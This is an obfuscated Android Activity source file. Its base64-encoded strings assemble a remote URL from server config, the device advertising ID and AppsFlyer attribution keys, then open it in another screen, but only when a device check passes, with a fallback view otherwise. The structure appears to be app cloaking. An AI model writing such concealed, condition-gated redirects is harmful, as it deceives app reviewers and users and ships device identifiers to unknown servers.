package com.raaageee.buuuffaaaloo.vbjfdl;

import android.app.Activity;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;
import android.widget.ProgressBar;

import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;

import com.onesignal.OneSignal;
import com.royrodriguez.transitionbutton.TransitionButton;


public class RB extends Activity {

    private TransitionButton transitionButtonS,transitionButtonP,transitionButtonC ;
    private ProgressBar inxa;
    public static String iabad;
    public static String injass = "";
    public static String ihjjwq;
    public static String uybbaq;
    public final static String oinwq = "VUY0OWFFZEtQanNqdHBBdHdZcG5Nbg==";
    public static String iuhxa = null;
    In in;


    @RequiresApi(api = Build.VERSION_CODES.O)
    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        getWindow().addFlags(1024);
        setContentView(R.layout.rg);

        transitionButtonS = findViewById(R.id.transition_buttonS);
        transitionButtonP = findViewById(R.id.transition_buttonP);
        transitionButtonC = findViewById(R.id.transition_buttonC);
        inxa = findViewById(R.id.bar);
        RandomImg1.bar = inxa;
        RandomImg1.transitionButtonS = transitionButtonS;
        RandomImg1.transitionButtonP = transitionButtonP;
        RandomImg1.transitionButtonC = transitionButtonC;
        RandomImg1.rb = this;
        Weqwe.rb = this;


        int odo = RandomText.dds(this);
        if (odo == 0){
           RandomImg3.oskk();
            new Handler().postDelayed(new Runnable() {
                @Override
                public void run() {
                    in = RandomImg3.in;

                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            RandomText.dddede(RB.this,in);

                        }
                    });

                }
            },3000);


           String savedLink = getSharedPreferences(getPackageName(), MODE_PRIVATE).getString(Msdas.oooo("c2F2ZWRVcmw="), "usjsdj");
            if (savedLink.equals("usjsdj")) {
                new Handler().postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        if (injass.equals(Msdas.oooo("Tm9uLW9yZ2FuaWM="))){
                            iuhxa =in.getIda() + uybbaq;
                            startActivity(new Intent(getApplicationContext(),WeqAc.class));
                        }else if(RandomText.ijsa != null) {
                            iuhxa = in.getIda() + RandomText.oijaq;
                            startActivity(new Intent(getApplicationContext(),WeqAc.class));
                        }else {
                            if (in.getOjska().equals(Msdas.oooo("Tk8="))) {
                                RandomImg1.ccc();;
                            }else {
                                String strAppsFlyer = in.getOjska() + Msdas.oooo("P2J1bmRsZT0=") + getPackageName() + Msdas.oooo("JmFkX2lkPQ==") + ihjjwq + Msdas.oooo("JmFwcHNfaWQ9")
                                        + iabad + Msdas.oooo("JmRldl9rZXk9") + Msdas.oooo(oinwq);
                                iuhxa = in.getIda() + strAppsFlyer;
                                startActivity(new Intent(getApplicationContext(),WeqAc.class));
                            }
                        }

                    }
                },6000);
            }else {

                startActivity(new Intent(getApplicationContext(),WeqAc.class));
                iuhxa = savedLink;
            }




        }else {
            RandomImg1.ccc();
        }

    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    @Override
    protected void onStart() {
        super.onStart();
        OneSignal.setLogLevel(OneSignal.LOG_LEVEL.VERBOSE, OneSignal.LOG_LEVEL.NONE);
        OneSignal.initWithContext(this);
        OneSignal.setAppId(Msdas.oooo("NGYzOTg1MDctZGNlZS00ZTc0LWEzNDUtZDhhMmRhZDc5MmRm"));

        RandomImg2.oroe(this);
    }
}
